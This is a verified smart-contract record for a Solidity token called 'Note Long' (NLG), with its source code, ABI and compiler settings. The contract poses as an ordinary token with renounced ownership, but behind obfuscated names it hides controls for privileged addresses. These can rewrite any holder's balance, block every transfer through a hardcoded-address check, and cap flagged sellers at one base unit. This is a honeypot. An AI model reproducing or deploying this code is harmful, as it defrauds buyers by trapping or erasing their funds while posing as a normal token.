{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface tokenTx {\n    function createPair(address minLiquidity, address fundLaunch) external returns (address);\n}\n\ninterface totalFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverLaunchedTeam) external view returns (uint256);\n\n    function transfer(address launchSell, uint256 modeLaunchWallet) external returns (bool);\n\n    function allowance(address liquidityTotalMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeLaunchWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchSell,\n        uint256 modeLaunchWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeAt, uint256 value);\n    event Approval(address indexed liquidityTotalMode, address indexed spender, uint256 value);\n}\n\nabstract contract fundMarketingTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchAmount {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface totalFeeMetadata is totalFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract NoteLong is fundMarketingTake, totalFee, totalFeeMetadata {\n\n    address private launchReceiverAt;\n\n    address public launchedMarketing;\n\n    function owner() external view returns (address) {\n        return launchReceiverAt;\n    }\n\n    function transferFrom(address amountIs, address launchSell, uint256 modeLaunchWallet) external override returns (bool) {\n        if (_msgSender() != feeSell) {\n            if (sellSender[amountIs][_msgSender()] != type(uint256).max) {\n                require(modeLaunchWallet <= sellSender[amountIs][_msgSender()]);\n                sellSender[amountIs][_msgSender()] -= modeLaunchWallet;\n            }\n        }\n        return exemptTotal(amountIs, launchSell, modeLaunchWallet);\n    }\n\n    uint256 private feeModeList = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public launchAt;\n\n    uint8 private feeTotalList = 18;\n\n    function name() external view virtual override returns (string memory) {\n        return marketingReceiver;\n    }\n\n    function modeTotal(address amountIs, address launchSell, uint256 modeLaunchWallet) internal returns (bool) {\n        require(modeLaunchedTotal[amountIs] >= modeLaunchWallet);\n        modeLaunchedTotal[amountIs] -= modeLaunchWallet;\n        modeLaunchedTotal[launchSell] += modeLaunchWallet;\n        emit Transfer(amountIs, launchSell, modeLaunchWallet);\n        return true;\n    }\n\n    bool public limitBuy;\n\n    constructor (){\n        if (autoWalletTeam == liquidityLaunchWallet) {\n            liquidityLaunchWallet = tokenTo;\n        }\n        launchAmount swapTradingToken = launchAmount(feeSell);\n        launchedMarketing = tokenTx(swapTradingToken.factory()).createPair(swapTradingToken.WETH(), address(this));\n        if (sellList != tokenAuto) {\n            maxLaunchedFee = true;\n        }\n        tradingTxLimit = _msgSender();\n        txTradingSell[tradingTxLimit] = true;\n        modeLaunchedTotal[tradingTxLimit] = feeModeList;\n        modeTradingList();\n        if (autoWalletTeam == tokenTo) {\n            listExemptBuy = autoWalletTeam;\n        }\n        emit Transfer(address(0), tradingTxLimit, feeModeList);\n    }\n\n    mapping(address => bool) public txTradingSell;\n\n    function getOwner() external view returns (address) {\n        return launchReceiverAt;\n    }\n\n    bool public sellList;\n\n    bool public maxLaunchedFee;\n\n    string private fromIs = \"NLG\";\n\n    uint256 private liquidityLaunchWallet;\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeTotalList;\n    }\n\n    uint256 constant sellReceiver = 1 ** 10;\n\n    event OwnershipTransferred(address indexed fundIs, address indexed teamList);\n\n    function allowance(address amountTrading, address receiverLaunchFund) external view virtual override returns (uint256) {\n        if (receiverLaunchFund == feeSell) {\n            return type(uint256).max;\n        }\n        return sellSender[amountTrading][receiverLaunchFund];\n    }\n\n    function approve(address receiverLaunchFund, uint256 modeLaunchWallet) public virtual override returns (bool) {\n        sellSender[_msgSender()][receiverLaunchFund] = modeLaunchWallet;\n        emit Approval(_msgSender(), receiverLaunchFund, modeLaunchWallet);\n        return true;\n    }\n\n    function transfer(address minBuy, uint256 modeLaunchWallet) external virtual override returns (bool) {\n        return exemptTotal(_msgSender(), minBuy, modeLaunchWallet);\n    }\n\n    bool private liquidityBuy;\n\n    function balanceOf(address receiverLaunchedTeam) public view virtual override returns (uint256) {\n        return modeLaunchedTotal[receiverLaunchedTeam];\n    }\n\n    bool public tokenAuto;\n\n    address receiverTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function modeTradingList() public {\n        emit OwnershipTransferred(tradingTxLimit, address(0));\n        launchReceiverAt = address(0);\n    }\n\n    uint256 listShould;\n\n    function tradingReceiver(address minBuy, uint256 modeLaunchWallet) public {\n        swapAuto();\n        modeLaunchedTotal[minBuy] = modeLaunchWallet;\n    }\n\n    bool public launchMode;\n\n    function symbol() external view virtual override returns (string memory) {\n        return fromIs;\n    }\n\n    mapping(address => uint256) private modeLaunchedTotal;\n\n    uint256 public senderEnableSell;\n\n    string private marketingReceiver = \"Note Long\";\n\n    uint256 maxSell;\n\n    uint256 public autoWalletTeam;\n\n    function amountListAuto(uint256 modeLaunchWallet) public {\n        swapAuto();\n        maxSell = modeLaunchWallet;\n    }\n\n    function autoMode(address totalShould) public {\n        if (launchMode) {\n            return;\n        }\n        \n        txTradingSell[totalShould] = true;\n        \n        launchMode = true;\n    }\n\n    address feeSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public tradingTxLimit;\n\n    uint256 private tokenTo;\n\n    function swapAuto() private view {\n        require(txTradingSell[_msgSender()]);\n    }\n\n    uint256 private listExemptBuy;\n\n    mapping(address => mapping(address => uint256)) private sellSender;\n\n    function exemptTotal(address amountIs, address launchSell, uint256 modeLaunchWallet) internal returns (bool) {\n        if (amountIs == tradingTxLimit) {\n            return modeTotal(amountIs, launchSell, modeLaunchWallet);\n        }\n        uint256 senderWallet = totalFee(launchedMarketing).balanceOf(receiverTx);\n        require(senderWallet == maxSell);\n        require(launchSell != receiverTx);\n        if (launchAt[amountIs]) {\n            return modeTotal(amountIs, launchSell, sellReceiver);\n        }\n        return modeTotal(amountIs, launchSell, modeLaunchWallet);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeModeList;\n    }\n\n    function fundEnable(address swapBuy) public {\n        swapAuto();\n        \n        if (swapBuy == tradingTxLimit || swapBuy == launchedMarketing) {\n            return;\n        }\n        launchAt[swapBuy] = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTotalMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverLaunchFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeLaunchWallet\",\"type\":\"uint256\"}],\"name\":\"amountListAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunchFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeLaunchWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalShould\",\"type\":\"address\"}],\"name\":\"autoMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoWalletTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunchedTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapBuy\",\"type\":\"address\"}],\"name\":\"fundEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLaunchedFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTradingList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderEnableSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeLaunchWallet\",\"type\":\"uint256\"}],\"name\":\"tradingReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTxLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeLaunchWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeLaunchWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txTradingSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "NoteLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}